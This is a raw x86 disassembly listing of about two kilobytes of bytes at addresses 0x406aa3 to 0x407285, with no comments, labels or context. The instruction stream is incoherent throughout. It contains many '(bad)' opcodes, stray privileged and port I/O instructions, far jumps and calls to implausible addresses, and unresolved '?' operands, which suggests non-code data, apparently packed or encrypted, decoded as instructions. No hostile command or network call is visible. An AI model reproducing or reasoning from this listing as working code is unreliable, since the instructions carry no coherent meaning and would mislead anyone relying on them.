  406aa3:	cli    
  406aa4:	imul   esp,DWORD PTR [edx],0xb14ba198
  406aaa:	mov    al,0x73
  406aac:	sahf   
  406aad:	icebp  
  406aae:	inc    esp
  406aaf:	cmp    DWORD PTR [ebx],eax
  406ab1:	cmp    dh,ah
  406ab3:	aaa    
  406ab4:	fdivr  QWORD PTR [edx-0xde8d975]
  406aba:	mov    edi,0xbf286103
  406abf:	call   0xd29a3bc9
  406ac4:	push   ds
  406ac5:	arpl   WORD PTR [ecx],ax
  406ac7:	stc    
  406ac8:	pop    esp
  406ac9:	dec    esp
  406aca:	jge    0x406b0c
  406acc:	push   ecx
  406acd:	xor    esi,DWORD PTR [eax-0x80]
  406ad0:	push   es
  406ad1:	dec    edx
  406ad2:	jb     0x406a89
  406ad4:	xlat   BYTE PTR ds:[ebx]
  406ad5:	adc    al,0x91
  406ad7:	std    
  406ad8:	mov    esi,0x2843c0fc
  406add:	retf   
  406ade:	(bad)  
  406ae0:	xlat   BYTE PTR ds:[ebx]
  406ae1:	ds fcomp st(5)
  406ae4:	mov    DWORD PTR [edi],esp
  406ae6:	cmp    DWORD PTR [edx],eax
  406ae8:	inc    eax
  406ae9:	mov    dh,al
  406aeb:	lods   al,BYTE PTR ds:[esi]
  406aec:	xor    eax,0x3c10360
  406af1:	dec    BYTE PTR [eax+0x52]
  406af4:	outs   dx,BYTE PTR ds:[esi]
  406af5:	or     BYTE PTR [edi+0x841c94d],0x6c
  406afc:	fsub   st(1),st
  406afe:	add    edx,DWORD PTR [ebp+eiz*1+0x2e]
  406b02:	sahf   
  406b03:	(bad)  
  406b04:	jno    0x406b44
  406b06:	int3   
  406b07:	xor    ecx,DWORD PTR ds:0x4442abd9
  406b0d:	in     eax,0x1c
  406b0f:	ret    0xaa22
  406b12:	(bad)  
  406b13:	xor    al,0x58
  406b15:	shl    BYTE PTR [eax+0x46c587eb],0xe0
  406b1c:	sub    al,BYTE PTR [ebp-0x70a1f92e]
  406b22:	mov    WORD PTR [eax-0xb],ds
  406b25:	pop    edx
  406b26:	and    esi,DWORD PTR cs:[esi-0x2d]
  406b2a:	fs push ds
  406b2c:	loop   0x406b66
  406b2e:	js     0x406ae3
  406b30:	loope  0x406b65
  406b32:	std    
  406b33:	xor    eax,0xb83bfc2e
  406b38:	dec    esp
  406b39:	fcom   DWORD PTR [ebx-0x38807014]
  406b3f:	in     al,dx
  406b40:	mov    bh,0xf6
  406b42:	loop   0x406b44
  406b44:	add    al,0xd5
  406b46:	cmp    BYTE PTR [edx-0xa],ah
  406b49:	jns    0x406b0e
  406b4b:	repnz adc BYTE PTR [edx+0x16],ch
  406b4f:	mov    ds:0x6c939d91,eax
  406b54:	scas   al,BYTE PTR es:[edi]
  406b55:	bound  esi,QWORD PTR [esi-0x16797dd1]
  406b5b:	jge    0x406b0e
  406b5d:	(bad)  
  406b5e:	and    esi,edx
  406b60:	mov    al,0x11
  406b62:	cmp    al,0x91
  406b64:	push   ss
  406b65:	es scas al,BYTE PTR es:[edi]
  406b67:	or     dh,ah
  406b69:	cmc    
  406b6a:	pop    esi
  406b6b:	std    
  406b6c:	push   ds
  406b6d:	dec    ebx
  406b6e:	mov    ebx,0xe209ddd4
  406b73:	fsubr  DWORD PTR [edx+eiz*8]
  406b76:	cmp    eax,0xd4e8d1f9
  406b7b:	ins    DWORD PTR es:[edi],dx
  406b7c:	xchg   ebx,eax
  406b7d:	js     0x406b43
  406b7f:	inc    ebx
  406b80:	dec    ebx
  406b81:	jmp    0x110717fe
  406b86:	dec    eax
  406b87:	sub    ebp,DWORD PTR gs:[edi-0x50a8fc80]
  406b8e:	(bad)  ds:0x3a0970b4
  406b94:	or     edx,DWORD PTR [edx-0x45df5ec4]
  406b9a:	dec    esi
  406b9b:	jecxz  0x406b56
  406b9d:	rcl    BYTE PTR [eax-0x1e659bb3],0x2b
  406ba4:	in     al,dx
  406ba5:	push   es
  406ba6:	or     al,0xa1
  406ba8:	mov    edx,0xe10e5cd6
  406bad:	or     cl,BYTE PTR [edx-0x66]
  406bb0:	mov    esp,0x4d3d5f33
  406bb5:	push   ecx
  406bb6:	inc    esi
  406bb7:	mov    ch,0x51
  406bb9:	enter  0x367a,0x12
  406bbd:	xchg   edx,eax
  406bbe:	push   edi
  406bbf:	fdiv   QWORD PTR [ebx-0x6f]
  406bc2:	add    dl,BYTE PTR ds:0xcdb12278
  406bc8:	xchg   BYTE PTR [eax+0x65],dh
  406bcb:	mov    gs,ebx
  406bcd:	push   ds
  406bce:	shl    edx,1
  406bd0:	jae    0x406ba8
  406bd2:	push   0x3afd208d
  406bd7:	xor    edx,edx
  406bd9:	popa   
  406bda:	inc    esi
  406bdb:	jne    0x406c43
  406bdd:	jmp    0x19f0:0xa4b79244
  406be4:	hlt    
  406be5:	sub    eax,0x73100c24
  406bea:	adc    eax,0xfd92ee00
  406bef:	and    bl,BYTE PTR [eax+ebx*1-0x208b0f44]
  406bf6:	sahf   
  406bf7:	stc    
  406bf8:	cmp    DWORD PTR [esi*8+0x2e6f5dec],edx
  406bff:	shl    BYTE PTR [edx],cl
  406c01:	inc    ecx
  406c02:	mov    bh,0x80
  406c04:	js     0x406bee
  406c06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c07:	push   eax
  406c08:	test   edi,0xc5205a13
  406c0e:	pop    ds
  406c0f:	arpl   WORD PTR [ebx+ebp*2+0x547a53b9],cx
  406c16:	adc    eax,0x1efad85f
  406c1b:	call   DWORD PTR [edx+0x7e4a5df1]
  406c21:	mov    dl,0xeb
  406c23:	loope  0x406c8a
  406c25:	jno    0x406be8
  406c27:	out    0x7d,eax
  406c29:	sub    cl,ch
  406c2b:	dec    esi
  406c2c:	(bad)  
  406c2d:	fisttp WORD PTR [esi]
  406c2f:	cmp    edx,DWORD PTR [esi]
  406c31:	or     DWORD PTR [edx+0x13ce80f3],esi
  406c37:	jg     0x406c11
  406c39:	add    eax,DWORD PTR [ecx+eax*1-0x64e7bfb5]
  406c40:	and    DWORD PTR [edi+0x58e25f3e],esi
  406c46:	mov    edi,0x60378b68
  406c4b:	or     ecx,DWORD PTR [esi+0x7e]
  406c4e:	add    DWORD PTR [eax+0x3100fd18],esp
  406c54:	sbb    BYTE PTR [edx-0x43],bh
  406c57:	mov    bl,0x64
  406c59:	push   ecx
  406c5a:	fild   DWORD PTR [ebx]
  406c5c:	adc    BYTE PTR ds:0x886f713,cl
  406c62:	in     eax,dx
  406c63:	sbb    al,0xaf
  406c65:	sbb    al,0x1c
  406c67:	push   0xdc17d3c9
  406c6c:	add    BYTE PTR ds:0x3b5da24b,dh
  406c72:	test   eax,0x5f603970
  406c77:	jmp    0xa960:0xbd9c749f
  406c7e:	fnstenv [ebx+0x12]
  406c81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c82:	jg     0x406c7c
  406c84:	xor    al,0x7c
  406c86:	or     eax,0xe75f797d
  406c8b:	mov    ah,0x39
  406c8d:	push   ebp
  406c8e:	leave  
  406c8f:	lock es push edx
  406c92:	ficomp DWORD PTR fs:[ebx-0xb]
  406c96:	or     bh,BYTE PTR [ebx+0x498298b7]
  406c9c:	cmp    esp,eax
  406c9e:	inc    eax
  406c9f:	fldcw  WORD PTR [ebx+0x2bbc8227]
  406ca5:	or     esp,esp
  406ca7:	ss push esp
  406ca9:	gs push ebp
  406cab:	fistp  QWORD PTR [ecx-0xa45738d]
  406cb1:	pusha  
  406cb2:	adc    DWORD PTR [edi+ebx*4-0xb],ecx
  406cb6:	mov    esp,0x5aefab86
  406cbb:	int    0x60
  406cbd:	pop    ss
  406cbe:	addr16 jne 0x406d20
  406cc1:	sti    
  406cc2:	sbb    edx,DWORD PTR [edx]
  406cc4:	jo     0x406d16
  406cc6:	ficomp DWORD PTR [ecx-0x54]
  406cc9:	shl    BYTE PTR [ecx-0x4673a935],1
  406ccf:	add    BYTE PTR [esi+0x62],bh
  406cd2:	inc    edi
  406cd3:	test   al,0xc3
  406cd5:	fs xchg ebx,eax
  406cd7:	gs mov eax,0xf80e0f1e
  406cdd:	mov    cl,0x3e
  406cdf:	jnp    0x406c76
  406ce1:	lock dec edx
  406ce3:	adc    DWORD PTR [ebx-0x50],edx
  406ce6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ce7:	push   0xe5344432
  406cec:	inc    esi
  406ced:	bound  ebp,QWORD PTR es:[ebx+eax*2-0x65]
  406cf2:	push   ecx
  406cf3:	dec    ecx
  406cf4:	mov    cl,0x49
  406cf6:	xor    eax,0xa86352e8
  406cfb:	clc    
  406cfc:	lds    ecx,FWORD PTR [edx-0x71]
  406cff:	ja     0x406d7a
  406d01:	fdivr  DWORD PTR [ebx+0x64c92411]
  406d07:	mov    ds:0x5cd5c1d2,al
  406d0c:	dec    edx
  406d0d:	aad    0x93
  406d0f:	lods   eax,DWORD PTR ds:[esi]
  406d10:	and    bl,BYTE PTR [esi]
  406d12:	gs push cs
  406d14:	(bad)  [ecx+0x71]
  406d17:	pop    ebp
  406d18:	ret    
  406d19:	cmp    al,0xdc
  406d1b:	aam    0xea
  406d1d:	jae    0x406cba
  406d1f:	and    DWORD PTR [ecx+edx*4+0x32],esi
  406d23:	push   eax
  406d24:	jno    0x406cdd
  406d26:	mov    cl,0x1a
  406d28:	jbe    0x406cfc
  406d2a:	(bad)  
  406d2c:	push   ebp
  406d2d:	pop    esp
  406d2e:	cmp    cl,BYTE PTR [eax]
  406d30:	mov    esp,0x5cf2d4ca
  406d35:	sbb    bl,BYTE PTR [ecx+0x72]
  406d38:	add    eax,0xdde3cf65
  406d3d:	mov    dl,cl
  406d3f:	(bad)  
  406d40:	rcl    DWORD PTR fs:0xc8bace2a,cl
  406d47:	mov    ecx,0xf4c6a3d0
  406d4d:	fdiv   st(6),st
  406d4f:	mov    ecx,0xe96498c7
  406d54:	in     eax,dx
  406d55:	leave  
  406d56:	lods   al,BYTE PTR ds:[esi]
  406d57:	pop    esp
  406d58:	jp     0x406db4
  406d5a:	mov    ah,0xd0
  406d5c:	out    dx,eax
  406d5d:	mov    WORD PTR [eax+0x5633b085],sp
  406d64:	mov    dl,0x79
  406d66:	add    ebx,esp
  406d68:	lock int 0x28
  406d6b:	lea    ebp,[ebx+ebx*1]
  406d6e:	daa    
  406d6f:	das    
  406d70:	pushw  0x71
  406d73:	jg     0x406d4e
  406d75:	or     cl,BYTE PTR [ebx]
  406d77:	retf   
  406d78:	sbb    ch,dh
  406d7a:	repnz mov ch,0x83
  406d7d:	jo     0x406d1c
  406d7f:	xchg   edi,eax
  406d80:	mov    ebp,0xe276c6cf
  406d85:	mov    ah,0x8d
  406d87:	push   ebp
  406d88:	inc    ebx
  406d89:	pop    ecx
  406d8a:	iret   
  406d8b:	push   0xec873ccb
  406d90:	inc    esi
  406d91:	add    esp,ebp
  406d93:	jg     0x406dc4
  406d95:	shl    BYTE PTR [edx+0x14960a28],0x85
  406d9c:	mov    bh,dl
  406d9e:	push   es
  406d9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406da0:	inc    ecx
  406da1:	ror    ebx,1
  406da3:	pop    edi
  406da4:	push   esp
  406da5:	jmp    0x944a:0x301e287b
  406dac:	inc    esp
  406dad:	jg     0x406d75
  406daf:	adc    al,0xd2
  406db1:	jae    0x406de0
  406db3:	or     eax,0xa12e8fc6
  406db8:	xchg   edx,eax
  406db9:	push   esp
  406dba:	popa   
  406dbb:	mov    BYTE PTR [ecx],cl
  406dbd:	mov    ch,bl
  406dbf:	jmp    0xf83acc
  406dc4:	sti    
  406dc5:	jp     0x406dfc
  406dc7:	mov    gs:0x7080f78e,al
  406dcd:	pop    ecx
  406dce:	(bad)  
  406dcf:	pop    edi
  406dd0:	dec    ebx
  406dd1:	ins    BYTE PTR es:[edi],dx
  406dd2:	call   0x3b7ea774
  406dd7:	out    dx,al
  406dd8:	ins    DWORD PTR es:[edi],dx
  406dd9:	cmp    BYTE PTR [eax],dh
  406ddb:	push   0xf
  406ddd:	aas    
  406dde:	push   ebp
  406ddf:	sub    al,0xcb
  406de1:	lahf   
  406de2:	test   eax,0xe1ea11f4
  406de7:	hlt    
  406de8:	push   ebx
  406de9:	cmp    BYTE PTR [esi+0x732ffc08],al
  406def:	popf   
  406df0:	sub    ah,BYTE PTR [edx-0x460edea1]
  406df6:	loopne 0x406d80
  406df8:	jbe    0x406e32
  406dfa:	push   cs
  406dfb:	or     DWORD PTR [esi-0x3d3afe05],0xe
  406e02:	repnz pusha 
  406e04:	jp     0x406d9c
  406e06:	cmp    ch,dh
  406e08:	sub    DWORD PTR [edi+0x58f11879],0xed636e84
  406e12:	cld    
  406e13:	mov    ah,0x36
  406e15:	or     al,0xab
  406e17:	push   ecx
  406e18:	fadd   QWORD PTR [edi]
  406e1a:	xchg   edx,eax
  406e1b:	cmp    DWORD PTR [eax-0x13],ecx
  406e1e:	ds out dx,al
  406e20:	int3   
  406e21:	dec    ecx
  406e22:	add    DWORD PTR [ebx],eax
  406e24:	and    bl,bl
  406e26:	push   0xffffff90
  406e28:	pop    ss
  406e29:	jecxz  0x406e07
  406e2b:	lock mov ch,0xdd
  406e2e:	sub    DWORD PTR [ebp-0x18aa8bd9],eax
  406e34:	push   cs
  406e35:	jae    0x406e84
  406e37:	inc    edi
  406e39:	sub    ch,bh
  406e3b:	dec    esp
  406e3c:	pop    ds
  406e3d:	push   ss
  406e3e:	jne    0x406ea9
  406e40:	mov    dl,0x15
  406e42:	xor    al,bl
  406e44:	fimul  WORD PTR [edi+ecx*4+0x4a86c2c]
  406e4b:	jge    0x406df8
  406e4d:	arpl   WORD PTR [eax],dx
  406e4f:	xlat   BYTE PTR ds:[ebx]
  406e50:	(bad)  
  406e51:	call   0x66ed4e41
  406e56:	push   ebx
  406e57:	xchg   edx,eax
  406e58:	(bad)  
  406e59:	xchg   BYTE PTR [ecx-0x3e],dh
  406e5c:	lds    edi,FWORD PTR [eax]
  406e5e:	adc    BYTE PTR [edi],dh
  406e60:	adc    eax,0x9f795a12
  406e65:	xchg   esp,eax
  406e66:	pop    ebx
  406e67:	pushf  
  406e68:	ror    DWORD PTR [ecx+0x4b280007],1
  406e6e:	inc    esp
  406e6f:	gs inc edi
  406e71:	sub    BYTE PTR [eax+0x4c7dba9b],al
  406e77:	daa    
  406e78:	or     edi,DWORD PTR ds:0xa4b0261b
  406e7e:	sub    DWORD PTR [ebx+ebp*1],edx
  406e81:	add    dh,BYTE PTR [edi+edi*1]
  406e84:	add    eax,0x90a24672
  406e89:	out    0xb9,al
  406e8b:	fadd   QWORD PTR [edi]
  406e8d:	mov    ch,0x69
  406e8f:	jl     0x406ec3
  406e91:	cli    
  406e92:	iret   
  406e93:	inc    esp
  406e94:	xchg   edi,eax
  406e95:	je     0x406ec4
  406e97:	sbb    eax,0xcf166a57
  406e9c:	mov    ah,0x2f
  406e9e:	stos   BYTE PTR es:[edi],al
  406e9f:	jb     0x406e4c
  406ea1:	outs   dx,DWORD PTR ds:[esi]
  406ea2:	ins    DWORD PTR es:[edi],dx
  406ea3:	fcomi  st,st(6)
  406ea5:	test   eax,0x47159d4f
  406eaa:	xor    ecx,ecx
  406eac:	and    edi,DWORD PTR [ecx]
  406eae:	or     bl,0x8c
  406eb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406eb2:	pop    ecx
  406eb3:	jne    0x406ea2
  406eb5:	das    
  406eb6:	test   al,0x54
  406eb8:	gs std 
  406eba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ebb:	aam    0x75
  406ebd:	add    al,0x53
  406ebf:	out    0x86,eax
  406ec1:	push   edx
  406ec2:	sub    DWORD PTR [edi],ebp
  406ec4:	add    DWORD PTR [ebp-0x4ed8cad6],0xe4bd685f
  406ece:	pop    ss
  406ecf:	pop    edi
  406ed0:	dec    ebx
  406ed1:	or     dl,BYTE PTR [eax+0x33]
  406ed4:	inc    ecx
  406ed5:	and    eax,0x37d2c266
  406eda:	ins    DWORD PTR es:[edi],dx
  406edb:	repnz adc DWORD PTR [ecx+ebp*4+0x542b0f79],ecx
  406ee3:	fldcw  WORD PTR [ecx-0x2ba1b5cf]
  406ee9:	xchg   esp,eax
  406eea:	data16 or BYTE PTR [esi],cl
  406eed:	and    bh,BYTE PTR [edi-0x662bfe8d]
  406ef3:	and    ah,BYTE PTR [ebp-0x15]
  406ef6:	(bad)  
  406ef7:	and    BYTE PTR [ebx+0x562c2493],dl
  406efd:	(bad)  [eax]
  406eff:	sbb    eax,0xb4b8238
  406f04:	(bad)  
  406f05:	out    dx,al
  406f06:	mov    ah,0x83
  406f08:	pop    edi
  406f09:	sahf   
  406f0a:	sti    
  406f0b:	jle    0x406f7f
  406f0d:	and    esi,DWORD PTR ss:[esi]
  406f10:	jl     0x406eeb
  406f12:	aaa    
  406f13:	test   al,0x3c
  406f15:	pop    ds
  406f16:	dec    esi
  406f17:	sub    dl,al
  406f19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f1a:	mov    eax,0xcb9b61d
  406f1f:	repz push ss
  406f21:	in     al,dx
  406f22:	sti    
  406f23:	add    al,0x6
  406f25:	in     al,0x6e
  406f27:	mov    cx,0xa5b5
  406f2b:	mov    eax,ds:0x50ad5084
  406f30:	aam    0x2a
  406f32:	inc    esi
  406f33:	push   ss
  406f34:	repnz and DWORD PTR [ebx-0x78c02cf0],edi
  406f3b:	or     dl,al
  406f3d:	arpl   WORD PTR [ebp+eax*2-0x71],ax
  406f41:	(bad)  
  406f42:	int3   
  406f43:	push   eax
  406f44:	dec    edi
  406f45:	inc    ebx
  406f46:	lods   al,BYTE PTR ds:[esi]
  406f47:	jecxz  0x406edc
  406f49:	mov    ah,BYTE PTR [ecx-0x788c6d07]
  406f4f:	mov    ch,0xc6
  406f51:	adc    eax,0x9b0417ca
  406f56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f57:	lea    edi,[edi+0x22]
  406f5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f5b:	es je  0x406f7a
  406f5e:	xchg   edi,eax
  406f5f:	sub    esp,DWORD PTR [edx]
  406f61:	hlt    
  406f62:	(bad)  
  406f63:	dec    edi
  406f64:	or     eax,0x94d167f6
  406f69:	dec    ebp
  406f6a:	inc    esi
  406f6b:	pushf  
  406f6c:	xchg   ecx,eax
  406f6d:	xchg   esi,eax
  406f6e:	sbb    eax,0xdd988a8a
  406f73:	add    cl,al
  406f75:	jne    0x406f66
  406f77:	mov    ch,0xea
  406f79:	inc    ecx
  406f7a:	xlat   BYTE PTR ds:[ebx]
  406f7b:	ins    DWORD PTR es:[edi],dx
  406f7c:	jg     0x406f35
  406f7e:	enter  0x2863,0xe2
  406f82:	shr    BYTE PTR [ebx+0x43a7a475],1
  406f88:	mov    eax,0x10246791
  406f8d:	jno    0x406f86
  406f8f:	leave  
  406f90:	aad    0xc6
  406f92:	and    eax,0x500cd7ac
  406f97:	ins    DWORD PTR es:[edi],dx
  406f98:	dec    ebx
  406f99:	inc    edi
  406f9a:	sub    al,0x3e
  406f9c:	xor    eax,0x503acb04
  406fa1:	and    BYTE PTR ds:0x5b321710,dl
  406fa8:	rcr    DWORD PTR ds:0xc6c4d546,0xe0
  406faf:	aam    0x53
  406fb1:	test   DWORD PTR [edi-0x39],ecx
  406fb4:	cmp    eax,0xedb0437d
  406fb9:	enter  0xa9f3,0xeb
  406fbd:	pop    ecx
  406fbe:	and    dl,BYTE PTR [esi]
  406fc0:	aad    0x50
  406fc2:	push   ebp
  406fc3:	fisub  WORD PTR [edx+edi*4-0x27]
  406fc7:	hlt    
  406fc8:	xor    ebp,eax
  406fca:	pop    edx
  406fcb:	(bad)  
  406fcc:	fild   WORD PTR [ecx+0x24]
  406fcf:	jge    0x406f69
  406fd1:	lds    edx,FWORD PTR [ebx+0x7b]
  406fd4:	mov    edx,DWORD PTR [edx+esi*1+0x3468c022]
  406fdb:	or     ah,BYTE PTR [edx-0x8]
  406fde:	gs inc ebp
  406fe0:	or     ecx,ecx
  406fe2:	sbb    al,0xbf
  406fe4:	ficomp DWORD PTR ss:[edi-0x54ae8e94]
  406feb:	mov    ebp,0xf6d7f8b6
  406ff0:	hlt    
  406ff1:	aad    0xd1
  406ff3:	bswap  eax
  406ff5:	push   ebx
  406ff6:	inc    edx
  406ff7:	addr16 pop edx
  406ff9:	test   BYTE PTR [ebp+0x4ec0e4f0],0xab
  407000:	aas    
  407001:	pop    ebx
  407002:	jno    0x406f95
  407004:	aaa    
  407005:	(bad)  
  407006:	in     eax,0xfd
  407008:	mov    al,ds:0x1e06d20b
  40700d:	xchg   esp,eax
  40700e:	imul   DWORD PTR [esi-0x49]
  407011:	push   es
  407012:	pop    esi
  407013:	inc    ebx
  407014:	xchg   ecx,eax
  407015:	icebp  
  407016:	mov    eax,0xf21ccc27
  40701b:	xchg   esi,eax
  40701c:	push   cs
  40701d:	pop    ebx
  40701e:	adc    eax,eax
  407020:	inc    ebx
  407021:	push   eax
  407022:	mov    ds:0x4b9318d7,al
  407027:	sub    eax,0x1a2a040f
  40702c:	cs ja  0x40702f
  40702f:	or     dl,BYTE PTR [ebx-0x5b5bb996]
  407035:	cdq    
  407036:	(bad)  
  407037:	clc    
  407038:	sbb    eax,0x182ea24b
  40703d:	enter  0x24cb,0xa1
  407041:	mov    edi,0x38dff2d0
  407046:	arpl   WORD PTR [edx],bx
  407048:	(bad)  
  407049:	xor    dl,BYTE PTR [ecx]
  40704b:	or     bl,dh
  40704d:	fcom   QWORD PTR [ecx-0x7]
  407050:	mov    ecx,0xfde4afd7
  407055:	aam    0xb2
  407057:	iret   
  407058:	inc    ebx
  407059:	ss call 0x4a85:0x7cf0a37c
  407061:	push   esp
  407062:	mov    DWORD PTR [eax+0x22932893],esp
  407068:	lahf   
  407069:	mov    esp,0x7f6c4349
  40706e:	neg    DWORD PTR [edx-0x6db46ca4]
  407074:	lahf   
  407075:	pop    ebx
  407076:	push   0x687f196a
  40707b:	ins    DWORD PTR es:[edi],dx
  40707c:	std    
  40707d:	adc    BYTE PTR [eax+0x23],dh
  407080:	inc    esp
  407081:	fiadd  WORD PTR [esi+0x566da91c]
  407087:	fsubr  QWORD PTR [eax+0x2f75d145]
  40708d:	jp     0x40702b
  40708f:	xchg   ebx,eax
  407090:	jg     0x407012
  407092:	ret    
  407093:	retf   0xc60
  407096:	cmp    eax,eax
  407098:	icebp  
  407099:	push   ebp
  40709a:	(bad)  [ebx-0x69c5092c]
  4070a0:	add    esp,DWORD PTR [esi]
  4070a2:	mov    dh,0x5b
  4070a4:	and    eax,0x79e1e9c7
  4070a9:	mov    ebp,0x3116448a
  4070ae:	mov    al,ds:0x3648adda
  4070b3:	mov    al,0x4d
  4070b5:	outs   dx,DWORD PTR ds:[esi]
  4070b6:	add    edx,esp
  4070b8:	gs sbb ah,bl
  4070bb:	adc    al,0x7f
  4070bd:	and    esi,DWORD PTR [edi+0x42]
  4070c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070c1:	(bad)  
  4070c2:	js     0x40713d
  4070c4:	clc    
  4070c5:	jbe    0x4070be
  4070c7:	fcom   QWORD PTR [ebp+0x3]
  4070ca:	in     eax,dx
  4070cb:	xor    eax,0x65d61ccd
  4070d0:	or     eax,DWORD PTR [eax+0x62]
  4070d3:	xchg   di,ax
  4070d5:	mov    DWORD PTR [eax],edx
  4070d7:	push   edx
  4070d8:	inc    ecx
  4070d9:	cmp    eax,0xeccd460e
  4070de:	xchg   ebx,eax
  4070df:	pop    ecx
  4070e0:	les    esp,FWORD PTR [ebp+0x35]
  4070e3:	test   dh,ch
  4070e5:	mov    DWORD PTR ss:[esi+0x65c10639],ecx
  4070ec:	cmp    al,0x9b
  4070ee:	xchg   BYTE PTR [edx],al
  4070f0:	or     DWORD PTR [ecx],0xabea7f38
  4070f6:	das    
  4070f7:	pop    edx
  4070f8:	inc    ebp
  4070f9:	or     al,0xa2
  4070fb:	pop    es
  4070fc:	mov    eax,ds:0x340fd766
  407101:	cmovnp esi,DWORD PTR [edx]
  407104:	pop    esp
  407105:	add    eax,0xddfbdd0d
  40710a:	addr16 sti 
  40710c:	clc    
  40710d:	popw   ds
  40710f:	add    DWORD PTR [ebp+0x19],ecx
  407112:	mov    DWORD PTR [ecx],edx
  407114:	pop    edi
  407115:	add    ebx,DWORD PTR [esi]
  407117:	(bad)  
  407118:	popa   
  407119:	aam    0x74
  40711b:	out    0x19,al
  40711d:	sbb    eax,0x1450b595
  407122:	adc    edi,DWORD PTR [edx-0x47]
  407125:	stos   BYTE PTR es:[edi],al
  407126:	inc    eax
  407127:	mov    eax,ds:0x1f3c9af0
  40712c:	loop   0x4070c6
  40712e:	ds push ds
  407130:	dec    ebx
  407131:	mov    eax,0xd37b140d
  407136:	shl    BYTE PTR [ecx-0x7a3ae475],1
  40713c:	mov    ds:0x37b13088,eax
  407141:	push   edi
  407142:	sbb    al,0x3a
  407144:	aad    0xf3
  407146:	out    0x1e,eax
  407148:	inc    ebp
  407149:	arpl   WORD PTR [ebp-0x4c],dx
  40714c:	lahf   
  40714d:	cvtps2pi mm1,QWORD PTR [ebp+ebx*2-0x72ac2c9f]
  407155:	push   ss
  407156:	inc    esp
  407157:	or     cl,BYTE PTR [edx]
  407159:	pop    ds
  40715a:	imul   ebx,DWORD PTR [ebp-0x43f8841e],0xffffffae
  407161:	mov    BYTE PTR [ecx-0x7d],ah
  407164:	imul   ebx,DWORD PTR [ebx-0x3a119a9],0xda24e686
  40716e:	push   es
  40716f:	or     esp,ebx
  407171:	enter  0xe6f8,0xd0
  407175:	push   eax
  407176:	hlt    
  407177:	in     al,0xc0
  407179:	lds    eax,FWORD PTR [ebx+0x11]
  40717c:	icebp  
  40717d:	(bad)  
  40717e:	cmc    
  40717f:	adc    DWORD PTR [ecx+0x5213327d],eax
  407185:	repnz mov eax,ds:0x2408dd28
  40718b:	(bad)  
  40718c:	test   ebp,0x68fd58f7
  407192:	jg     0x407202
  407194:	dec    ebx
  407195:	(bad)  
  407196:	mov    gs,WORD PTR [ebp-0x15]
  407199:	pop    edi
  40719a:	cmc    
  40719b:	retf   0x5402
  40719e:	clc    
  40719f:	jnp    0x407168
  4071a1:	adc    edi,DWORD PTR [esi-0x4c]
  4071a4:	mov    WORD PTR [ebp+0xe],?
  4071a7:	adc    BYTE PTR [edi+0x65],dl
  4071aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071ab:	popa   
  4071ac:	cmp    dh,BYTE PTR [edi+ebx*1-0xa09d0eb]
  4071b3:	mov    ecx,0xd4d6860d
  4071b8:	out    0x83,eax
  4071ba:	inc    ecx
  4071bb:	adc    edx,esi
  4071bd:	ins    BYTE PTR es:[edi],dx
  4071be:	out    dx,al
  4071bf:	cmp    BYTE PTR [esi-0x7],dh
  4071c2:	aam    0xe5
  4071c4:	or     bl,dl
  4071c6:	jno    0x4071d3
  4071c8:	pop    es
  4071c9:	mov    ds:0x6ba28d6a,eax
  4071ce:	sbb    al,0xfd
  4071d0:	mov    dl,0x1e
  4071d2:	idiv   DWORD PTR [edx]
  4071d4:	cmp    BYTE PTR [eax-0x2b],0xdc
  4071d8:	call   0xbb23e82c
  4071dd:	retf   
  4071de:	das    
  4071df:	loopne 0x407187
  4071e1:	jge    0x407210
  4071e3:	aad    0xdc
  4071e5:	xchg   DWORD PTR [ebp-0x300179fc],esp
  4071eb:	inc    esi
  4071ec:	mov    bl,BYTE PTR [ebx-0x8]
  4071ef:	push   ebx
  4071f0:	sar    cl,0x94
  4071f3:	daa    
  4071f4:	sub    ah,dl
  4071f6:	pop    ebp
  4071f8:	push   ebp
  4071f9:	out    0x93,eax
  4071fb:	push   edx
  4071fc:	jo     0x407215
  4071fe:	call   0x7e7d1ec4
  407203:	fisub  DWORD PTR ds:[ebp+eiz*2-0xf]
  407208:	inc    ebx
  407209:	jb     0x407210
  40720b:	enter  0xf301,0x33
  40720f:	add    BYTE PTR [ecx],0x9e
  407212:	cmp    edi,DWORD PTR [ebp-0x6c9949b5]
  407218:	sti    
  407219:	adc    al,0xac
  40721b:	mov    BYTE PTR [ebx],cl
  40721d:	xchg   ecx,eax
  40721e:	add    eax,DWORD PTR [ebx]
  407220:	lea    ecx,[esi]
  407222:	ds mov eax,0xcb393cbe
  407228:	fs dec ebx
  40722a:	mov    esi,0xf9813e57
  40722f:	int3   
  407230:	xchg   edi,eax
  407231:	pop    eax
  407232:	int3   
  407233:	xor    eax,0xce73032
  407238:	inc    esi
  407239:	jmp    0x84ac:0xdf841a56
  407240:	sti    
  407241:	mov    edi,0xb039801f
  407246:	outs   dx,BYTE PTR ds:[esi]
  407247:	push   eax
  407248:	or     dh,BYTE PTR [eax-0x329d04e0]
  40724e:	push   es
  40724f:	mov    bh,0xf4
  407251:	pop    ds
  407252:	xchg   BYTE PTR [ecx-0x14],ch
  407255:	mov    ebp,0xa15bc22
  40725a:	pop    ecx
  40725b:	pop    ebp
  40725c:	idiv   al
  40725e:	mov    ?,WORD PTR [edi-0x37]
  407261:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407262:	stc    
  407263:	adc    ebx,DWORD PTR [edi-0x4bf5d430]
  407269:	sub    BYTE PTR [ebx-0x7],bl
  40726c:	cs mov cl,0x43
  40726f:	(bad)  
  407270:	pop    eax
  407271:	inc    esi
  407272:	les    edx,FWORD PTR [eax+0x71]
  407275:	push   ebp
  407276:	sub    bh,cl
  407278:	or     eax,0x8a1f2cd8
  40727d:	fcmovb st,st(6)
  40727f:	fcmovnu st,st(6)
  407281:	neg    esi
  407283:	sar    DWORD PTR [ecx],cl
  407285:	mov    esi,0x53e9b851
